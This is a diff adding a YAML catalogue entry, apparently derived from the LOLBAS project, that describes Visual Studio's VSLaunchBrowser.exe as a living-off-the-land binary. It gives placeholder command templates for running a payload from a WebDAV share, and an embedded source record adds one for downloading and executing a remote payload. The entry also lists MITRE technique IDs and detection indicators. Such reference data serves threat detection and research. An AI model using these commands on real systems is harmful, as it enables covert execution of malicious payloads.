@@ -1,0 +1,101 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL1ZzTGF1bmNoQnJvd3Nlci55bWw/RXhlY3V0ZQ/2
+type: binary
+platform: windows
+name: VSLaunchBrowser.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1127
+opsec:
+  noise: high
+  triggers: cmd.exe as sub-process of VSLaunchBrowser
+commands:
+- template: VSLaunchBrowser.exe .exe {PATH_SMB}
+  comment: Execute payload from WebDAV server via VSLaunchBrowser as parent process
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/VsLaunchBrowser/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: VSLaunchBrowser.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1127
+      source_file: OtherMSBinaries/VsLaunchBrowser.yml
+      command_source_index: 2
+      document_utf8: "---\nName: VSLaunchBrowser.exe\nDescription: Microsoft Visual Studio browser launcher\
+        \ tool for web applications debugging\nAuthor: Avihay Eldad\nCreated: 2024-04-12\nCommands:\n\
+        \  - Command: VSLaunchBrowser.exe .exe {REMOTEURL:.exe}\n    Description: Download and execute\
+        \ payload from remote server\n    Usecase: It will download a remote file to INetCache and open\
+        \ it using the default app associated with the supplied file extension with VSLaunchBrowser as\
+        \ parent process.\n    Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem:\
+        \ Windows\n    Tags:\n      - Download: INetCache\n  - Command: VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}\n\
+        \    Description: Execute payload via VSLaunchBrowser as parent process\n    Usecase: It will\
+        \ open a local file using the default app associated with the supplied file extension with VSLaunchBrowser\
+        \ as parent process.\n    Category: Execute\n    Privileges: User\n    MitreID: T1127\n    OperatingSystem:\
+        \ Windows\n    Tags:\n      - Execute: EXE\n  - Command: VSLaunchBrowser.exe .exe {PATH_SMB}\n\
+        \    Description: Execute payload from WebDAV server via VSLaunchBrowser as parent process\n \
+        \   Usecase: It will open a remote file using the default app associated with the supplied file\
+        \ extension with VSLaunchBrowser as parent process.\n    Category: Execute\n    Privileges: User\n\
+        \    MitreID: T1127\n    OperatingSystem: Windows\n    Tags:\n      - Execute: EXE\n      - Execute:\
+        \ Remote\nFull_Path:\n  - Path: C:\\Program Files\\Microsoft Visual Studio\\<version>\\Community\\\
+        Common7\\IDE\\VSLaunchBrowser.exe\n  - Path: C:\\Program Files (x86)\\Microsoft Visual Studio\\\
+        <version>\\Community\\Common7\\IDE\\VSLaunchBrowser.exe\nDetection:\n  - IOC: cmd.exe as sub-process\
+        \ of VSLaunchBrowser\n  - IOC: URL on a VSLaunchBrowser command line\n  - IOC: VSLaunchBrowser\
+        \ making unexpected network connections or DNS requests\nAcknowledgement:\n  - Person: Avihay\
+        \ Eldad\n    Handle: '@AvihayEldad'\n"
+      document_sha256: sha256:6e3a207e1528fa3536af203e1dbf327a2decd8e6d49a152c9a7df81da95922ae
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/VsLaunchBrowser/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1127
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:eb2d813eac670c4e9db17fb28085b555ee6cf12609a5dba85c03bec858fdeb7b
